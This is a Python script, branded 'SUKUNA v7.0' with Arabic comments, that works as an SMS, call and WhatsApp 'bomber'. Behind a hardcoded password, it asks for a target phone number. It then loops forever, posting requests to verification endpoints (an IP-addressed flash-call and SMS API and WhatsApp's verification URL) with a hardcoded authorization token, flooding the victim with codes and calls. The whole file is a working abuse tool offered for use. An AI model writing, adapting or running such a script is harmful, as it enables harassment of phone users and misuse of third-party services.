import aiohttp, asyncio, json, sys, os, subprocess, webbrowser

# الألوان
G, R, Y, C, W = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

# ميزة التحديث التلقائي
def check_for_updates():
    try:
        subprocess.run(["git", "pull"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

# ميزة كلمة السر المتكررة
def check_password():
    while True:
        banner()
        pwd = input(f"{Y}[?] Enter Password: {W}")
        if pwd == "1121":
            print(f"{G}[+] Access Granted! Welcome Ali.")
            break
        else:
            print(f"{R}[!] Wrong Password! Try again.")
            os.system('sleep 2')

def banner():
    os.system('clear')
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}v7.0
    {G}King: Ali Talib (SUKUNA) | {C}Status: Original Engine
    -------------------------------------------""")

async def attack_engine(phone, mode):
    ok, bad = 0, 0
    # الهيدر الأصلي الشغال الذي أرسلته
    headers = {
        'User-Agent': "okxgvhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8",
        'Authorization': "s6abj8F2euaFCk6"
    }

    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # خيار 1: الاتصال القديم (نفس الرابط والبيانات)
                if mode == '1':
                    url = "https://31.171.171.90/api/phone-numbers/auth-flash-call"
                    data = {"phoneNumber": phone}
                
                # خيار 2: رسائل SMS
                elif mode == '2':
                    url = "https://31.171.171.90/api/phone-numbers/auth-sms"
                    data = {"phoneNumber": phone}
                
                # خيار 3 & 4: الواتساب (رسائل وصوت)
                else:
                    meth = "sms" if mode == '3' else "voice"
                    url = "https://v.whatsapp.com/v2/verification"
                    data = {"number": phone.replace('+', ''), "method": meth, "language": "ar"}

                async with session.post(url, data=json.dumps(data), headers=headers, timeout=10) as resp:
                    resp_text = await resp.text()
                    # التحقق من النجاح حسب السكربت الأصلي
                    if '{"allow":true}' in resp_text or resp.status in [200, 201]:
                        ok += 1
                    else:
                        bad += 1
            except:
                bad += 1
            
            sys.stdout.write(f"\r{G}[+] Success = {ok}  {R}[-] Failed = {bad} {W}| {Y}Mode: {mode}")
            sys.stdout.flush()
            # الحفاظ على سرعة السكربت الأصلي (8 ثواني) لتجنب الحظر
            await asyncio.sleep(8)

def main():
    check_for_updates()
    check_password()
    
    print(f"\n{C}[1] Fast Call (Original) | [2] SMS Spam")
    print(f"{G}[3] WhatsApp SMS       | [4] WhatsApp Voice")
    
    choice = input(f"\n{Y}[#] Select: {W}")
    target = input(f"{Y}[+] Target (+967...): {W}")

    if choice in ['1', '2', '3', '4']:
        print(f"\n{R}[!] SUKUNA is launching the curse...{W}")
        try:
            asyncio.run(attack_engine(target, choice))
        except KeyboardInterrupt:
            print(f"\n{R}[!] Stopped.")
    else:
        print(f"{R}[!] Invalid Choice.")

if __name__ == "__main__":
    # فتح القناة كما في السكربت الأصلي
    try: webbrowser.open('https://t.me/vipcode3')
    except: pass
    main()
